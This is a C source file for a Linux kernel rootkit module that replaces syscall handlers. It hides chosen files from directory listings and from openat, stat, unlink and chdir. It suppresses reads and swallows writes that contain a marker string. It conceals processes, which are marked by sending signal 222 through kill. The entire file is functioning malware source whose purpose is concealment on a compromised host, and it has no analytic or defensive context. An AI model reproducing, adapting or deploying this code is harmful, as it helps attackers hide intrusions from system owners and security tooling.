#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/errno.h>
#include <linux/sched.h>

#include "../../inc/config.h"
#include "calls.h"
#include "procs.h"

asmlinkage long h_getdents64(const struct pt_regs* regs){
  int ret;
  unsigned long offset = 0;
  struct linux_dirent64 *curr, *ker, *prev = NULL;
  struct linux_dirent64 __user *usr = (struct linux_dirent64 *)regs->si;
	
  syscall o_getdents64 = find_org("getdents64");
  if(o_getdents64 == 0) {
    print("cannot find getdents64");
    return -1;
  }

  ret = o_getdents64(regs);
  if(check_process())
    return ret;

  ker = kmalloc(ret, GFP_KERNEL);
  if((ret <= 0) || (ker == NULL) )
    return ret;

  if(copy_from_user(ker, usr, ret))
    goto DONE;

  while(offset < ret){
    curr = (void*)ker+offset;
    if(!check_file(curr->d_name)){
      prev = curr;
      offset += curr->d_reclen;
      continue;
    }

    if(curr==ker){
      ret -= curr->d_reclen;
      memmove(curr, (void *)curr + curr->d_reclen, ret);
      continue;
    }

    prev->d_reclen += curr->d_reclen;
    offset += curr->d_reclen;
  }

  copy_to_user(usr, ker, ret);
DONE:
  kfree(ker);
  return ret;
}

asmlinkage long h_getdents(const struct pt_regs* regs){
  struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_offset;
    unsigned short  d_reclen;
    char            d_name[];
  };

  int ret;
  unsigned long offset = 0;
  struct linux_dirent *curr, *ker, *prev = NULL;
  struct linux_dirent __user *usr = (struct linux_dirent *)regs->si;
	
  syscall o_getdents = find_org("getdents");
  if(o_getdents == 0) {
    print("cannot find getdents");
    return -1;
  }

  ret = o_getdents(regs);
  if(check_process())
    return ret;

  ker = kzalloc(ret, GFP_KERNEL);
  if((ret <= 0) || (ker == NULL) )
    return ret;

  if(copy_from_user(ker, usr, ret))
    goto DONE;

  while(offset < ret){
    curr = (void*)ker+offset;
    if(!check_file(curr->d_name)){
      prev = curr;
      offset += curr->d_reclen;
      continue;
    }

    if(curr==ker){
      ret -= curr->d_reclen;
      memmove(curr, (void *)curr + curr->d_reclen, ret);
      continue;
    }

    prev->d_reclen += curr->d_reclen;
    offset += curr->d_reclen;
  }

  copy_to_user(usr, ker, ret);
DONE:
  kfree(ker);
  return ret;
}

asmlinkage long h_openat(const struct pt_regs* regs){
  syscall o_openat = find_org("openat");
  char __user *pth = (char*)regs->si;
  int pth_len = strnlen_user(pth, PATH_MAX);
  char* ker_pth;
	
  if(o_openat == 0) {
    print("cannot find openat (we are fucked - get ready for panic)");
    return -1;
  }

  if(check_process())
    return o_openat(regs);
	
  ker_pth = kmalloc(pth_len, GFP_KERNEL);
  if(copy_from_user(ker_pth, pth, pth_len))	
    return o_openat(regs);

  if(!check_file(ker_pth)){
    kfree(ker_pth);
    return o_openat(regs);
  }

  kfree(ker_pth);
  return -ENOENT;
};

asmlinkage long h_statx(const struct pt_regs* regs){
  syscall o_statx = find_org("statx");
  char __user *pth = (char*)regs->si;
  int pth_len = strnlen_user(pth, PATH_MAX);
  char* ker_pth;
	
  if(o_statx == 0){
    print("cannot find statx");
    return -1;
  }

  if(check_process())
    return o_statx(regs);
	
  ker_pth = kmalloc(pth_len, GFP_KERNEL);
  if(copy_from_user(ker_pth, pth, pth_len))	
    return o_statx(regs);

  if(!check_file(ker_pth)){
    kfree(ker_pth);
    return o_statx(regs);
  }

  kfree(ker_pth);
  return -ENOENT;
};

asmlinkage long h_newfstatat(const struct pt_regs* regs){
  syscall o_newfstatat = find_org("newfstatat");
  char __user *pth = (char*)regs->si;
  int pth_len = strnlen_user(pth, PATH_MAX);
  char* ker_pth;
	
  if(o_newfstatat == 0){
    print("cannot find o_newfstatat");
    return -1;
  }

  if(check_process())
    return o_newfstatat(regs);
	
  ker_pth = kmalloc(pth_len, GFP_KERNEL);
  if(copy_from_user(ker_pth, pth, pth_len))	
    return o_newfstatat(regs);

  if(!check_file(ker_pth)){
    kfree(ker_pth);
    return o_newfstatat(regs);
  }

  kfree(ker_pth);
  return -ENOENT;
};

asmlinkage long h_unlinkat(const struct pt_regs* regs){
  syscall o_unlinkat = find_org("unlinkat");
  char __user *pth = (char*)regs->si;
  int pth_len = strnlen_user(pth, PATH_MAX);
  char* ker_pth;
	
  if(o_unlinkat == 0) {
    print("cannot find unlinkat");
    return -1;
  }

  if(check_process())
    return o_unlinkat(regs);
	
  ker_pth = kmalloc(pth_len, GFP_KERNEL);
  if(copy_from_user(ker_pth, pth, pth_len))	
    return o_unlinkat(regs);

  if(!check_file(ker_pth)){
    kfree(ker_pth);
    return o_unlinkat(regs);
  }

  kfree(ker_pth);
  return -ENOENT;
};

asmlinkage long h_chdir(const struct pt_regs* regs){
  syscall o_chdir = find_org("chdir");
  char __user *pth = (char*)regs->di;
  int pth_len = strnlen_user(pth, PATH_MAX);
  char* ker_pth;

  if(o_chdir == 0) {
    print("cannot find chdir");
    return -1;
  }

  if(check_process())
    return o_chdir(regs);
	
  ker_pth = kmalloc(pth_len, GFP_KERNEL);
  if(copy_from_user(ker_pth, pth, pth_len))	
    return o_chdir(regs);

  if(!check_file(ker_pth)){
    kfree(ker_pth);
    return o_chdir(regs);
  }

  kfree(ker_pth);
  return -ENOENT;
}

asmlinkage long h_read(const struct pt_regs* regs){
  syscall o_read = find_org("read");
  int buflen = (int)regs->dx;
  char __user *usrbuf = (char*)regs->si;
  char* kerbuf;
  int res;

  if(o_read == 0){
    print("cannot find read");
    return -1;
  }

  res = o_read(regs);
  if(check_process())
    return res;

  if(usrbuf == NULL)
    return res;

  if (buflen <= 0)
    return res;

  kerbuf = kmalloc(buflen, GFP_KERNEL);
  if(kerbuf == NULL)
    return res;

  if(copy_from_user(kerbuf, usrbuf, buflen))	
    return res;

  if(ncontains(kerbuf, USUM)) goto END;
  res = 1;
  copy_to_user(usrbuf, "\0", res);
  kfree(kerbuf);
  return res;

END:
  kfree(kerbuf);
  return res;
}

asmlinkage long h_write(const struct pt_regs* regs){
  syscall o_write = find_org("write");
  char __user *usrbuf = (char*)regs->si;
  int buflen = (int)regs->dx;
  char* kerbuf;
  int res;

  if(o_write == 0){
    print("cannot find write");
    return -1;
  }

  if(check_process())
    return o_write(regs);

  if(sizeof(usrbuf) > buflen)
    return o_write(regs);

  kerbuf = kmalloc(buflen, GFP_KERNEL);
  if(kerbuf == NULL)
    return res;

  if(copy_from_user(kerbuf, usrbuf, buflen))	
    return o_write(regs);

  if(ncontains(kerbuf, USUM)) goto CONT;
  kfree(kerbuf);
  return buflen;

CONT:
  kfree(kerbuf);
  return o_write(regs);
}

asmlinkage long h_kill(const struct pt_regs* regs){
  syscall o_kill = find_org("kill");
  int pid = (int)regs->di;
  int sig = (int)regs->si;

  if(o_kill == 0){
    print("cannot find kill");
    return -1;
  }

  if(check_process() && sig == 222){
    add_pid(pid);
    return 0;
  }

  if(check_process())
    return o_kill(regs);

  if(check_pid(pid))
    return -ESRCH;

  return o_kill(regs);
}
